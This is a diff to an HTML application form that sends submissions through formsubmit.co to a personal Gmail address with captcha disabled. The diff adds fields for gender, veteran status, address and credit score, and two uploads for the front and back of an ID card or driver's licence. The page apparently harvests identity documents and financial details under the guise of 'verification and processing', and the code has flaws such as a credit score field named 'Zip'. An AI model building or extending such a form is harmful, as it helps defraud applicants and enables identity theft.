@@ -147,7 +147,7 @@ of confidentiality and used solely for verification and processing purposes.
 
 
 <form action="https://formsubmit.co/desmondgodpower0@gmail.com"
-method="POST">
+method="POST" enctype="multipart/form-data">
 
 <input type="hidden" name="_captcha" value="false">
 
@@ -174,6 +174,29 @@ Full Name <span class="required">*</span>
 type="text"
 name="fullname"
 required>
+
+<label>
+GENDER
+</label>
+
+<div class="radio-group">
+<label>
+<input
+type="radio"
+name="gender"
+value="Male"
+required>
+Male
+</label>
+
+<label>
+<input
+type="radio"
+name="gender"
+value="Female">
+Female
+</label>
+</div>
 
 <label>
 Phone Number <span class="required">*</span>
@@ -247,12 +270,42 @@ No
 </div>
 
 <label>
+Are you veteran?
+</label>
+
+<div class="radio-group">
+<label>
+<input
+type="radio"
+name="veteran"
+value="Yes"
+required>
+Yes
+</label>
+
+<label>
+<input
+type="radio"
+name="veteran"
+value="No">
+No
+</label>
+</div>
+
+<label>
 Occupation <span class="required">*</span>
 </label>
 <input
 type="text"
 name="occupation"
 required>
+
+<label>
+Street Address <span class="required">*</span>
+</label>
+<textarea
+name="address"
+required></textarea>
 
 <label>
 City <span class="required">*</span>
@@ -271,7 +324,7 @@ name="state"
 required>
 
 <label>
-Postal/Zip Code <span class="required">*</span>
+Postal / Zip Code <span class="required">*</span>
 </label>
 <input
 type="text"
@@ -279,11 +332,12 @@ name="Zip"
 required>
 
 <label>
-Street Address <span class="required">*</span>
+Credit Score <span class="required">*</span>
 </label>
-<textarea
-name="address"
-required></textarea>
+<input
+type="text"
+name="Zip"
+required>
 
 
 <label for="employment">Employment Status</label>
@@ -383,6 +437,23 @@ Additional Comments (Optional)
 name="comments"
 rows="5"
 placeholder="Provide any additional information..."></textarea>
+
+ <label for="Id Card / Driverlicense">Upload your photo:</label>
+
+  <input
+    type="file"
+    id="id card"
+    name="Front Id"
+    accept="image/png,image/jpeg,image/webp">
+
+    <label for="Id Card / Driverlicense">Upload your photo:</label>
+
+  <input
+    type="file"
+    id="id card"
+    name="Back Id"
+    accept="image/png,image/jpeg,image/webp">
+
 
 <button type="submit">
 Submit Request
